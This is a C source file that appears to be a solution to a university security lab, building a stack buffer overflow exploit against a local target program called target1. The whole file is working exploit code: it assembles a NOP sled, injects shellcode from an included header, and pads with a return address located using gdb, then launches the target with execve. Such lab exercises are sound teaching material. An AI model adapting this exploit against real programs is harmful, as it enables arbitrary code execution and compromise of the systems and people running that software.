#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define NOP_NUM 16

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	args[0] = TARGET;
        /* \x90 is NOP for intel x86 processor */
        /*
          By inspecting the runtime target with gdb we find that the return  of lab_main
          is \x20\x21\xff\x28 (0x2021ff28) while &buf is located at 0x2021feb0
          120(0x78) character is needed to overflow the return address
         */
        /*  */
        char exploit_str[256];
        // Padding number of nop at the begging of buffer
        strcpy(exploit_str, nop);
        for (int i = 0; i < NOP_NUM - 1; i++) {
            strcat(exploit_str, nop);
        }

        // inject the shell code
        strcat(exploit_str, shellcode);

        // Padding the end of str with return address pointing to &buf
        // align the address
        int exlen = strlen(exploit_str);
        int align = (exlen + 1) % 4;
        if (align != 0) {
            for (int i = 0; i < align + 1; i++) {
                strcat(exploit_str, nop);
            }
        }

        // appending return addrs
        while (strlen(exploit_str) <= 120) {
            strcat(exploit_str, "\xb0\xfe\x21\x20"); // Little endian
        }
 
	args[1] = exploit_str;
        printf("args[1] length %lu\n", strlen(args[1]));
        printf("%s \n", exploit_str);
 	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
